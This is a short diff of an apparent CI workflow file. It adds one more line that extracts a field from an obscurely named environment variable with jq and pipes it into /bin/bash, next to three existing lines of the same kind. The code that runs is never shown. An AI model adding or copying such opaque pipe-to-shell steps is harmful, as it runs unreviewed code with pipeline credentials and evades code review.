@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$imhcp81107" | jq -r .r035 | /bin/bash
           printf '%s' "$k0" | jq -r .ubsn04443 | /bin/bash
           echo $dm3665 | jq -r .lrn3213 | /bin/bash
+          echo $cdnx24 | jq -r .us7 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
